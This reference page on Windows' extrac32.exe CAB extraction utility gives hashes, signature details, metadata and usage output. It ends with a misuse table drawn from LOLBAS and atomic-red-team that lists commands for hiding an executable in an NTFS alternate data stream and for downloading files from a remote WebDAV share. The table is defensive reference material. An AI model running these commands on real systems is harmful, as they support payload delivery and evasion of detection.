---
title: extrac32.exe | Microsoft CAB File Extract Utility
---

# extrac32.exe 

* File Path: `C:\Windows\SysWOW64\extrac32.exe`
* Description: Microsoft CAB File Extract Utility

## Hashes

Type | Hash
-- | --
MD5 | `9472AAB6390E4F1431BAA912FCFF9707`
SHA1 | `73EAE67D723328D609E43531E80DB37219ED5E02`
SHA256 | `A91D32973A1097EB1131FF630B0C082406703C48B8F442955DDA184C43BCE99E`
SHA384 | `4CC8041CC3F31EED5D5095DE077E0082674E884A6CE72B208641DE469D803796B3E71A9F978A75F27D60401E799C7979`
SHA512 | `8671662575E3166CB31875CB618FBD7ED4BD80112AD849F05CAE28B725E1DC129A6099D00879006E4F451B64E5B8DF558A4E8C35D274ED003FB572964008E09E`
SSDEEP | `768:jYDhe6vo5kwydC3ryl77oOP6emNLZnlOsWLuYksMfdxH:jOheqo5k77oe6eoyBuNsMfd`

## Runtime Data

### Usage (stdout):
```Batchfile
Microsoft (R) Cabinet Extraction Tool
Copyright (c) Microsoft Corporation. All rights reserved..

 Cabinet help

06-27-2020 12:19:14a A---     3,215,360 Microsoft-Windows-AppXDeploymentServer-Operational.evtx
06-27-2020 12:19:14a A---     1,118,208 Microsoft-Windows-Store-Operational.evtx
06-27-2020 12:19:14a A---        69,632 Microsoft-Windows-WindowsUpdateClient-Operational.evtx
06-27-2020 12:19:16a A---        69,632 Microsoft-Windows-TWinUI-Operational.evtx
06-27-2020 12:19:16a A---           270 registry_DNSPolicy.txt
06-26-2020 11:22:30p A---         8,192 SIH.20200626.232229.281.1.etl
06-27-2020 12:07:52a A---         8,192 SIH.20200627.000750.366.1.etl
06-27-2020 12:07:52a A---         8,192 SIH.20200627.000750.788.1.etl
06-27-2020 12:07:52a A---         8,192 SIH.20200627.000751.226.1.etl
06-27-2020 12:07:52a A---         8,192 SIH.20200627.000751.632.1.etl
06-27-2020 12:07:54a A---         8,192 SIH.20200627.000752.070.1.etl
06-03-2020  7:06:30p A---        65,536 dosvc.20200603_230629_927.etl
06-26-2020 11:24:02p A---        65,536 dosvc.20200627_032400_937.etl
06-26-2020 11:39:18p A---        65,536 dosvc.20200627_033917_646.etl
                14 Files      4,718,862 bytes

```

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: extrac32.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 5.00 (WinBuild.160101.0800)
* Product Version: 5.00
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `extrac32.exe` being misused. While `extrac32.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Name: Extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Path: C:\Windows\System32\extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `  - Path: C:\Windows\SysWOW64\extrac32.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


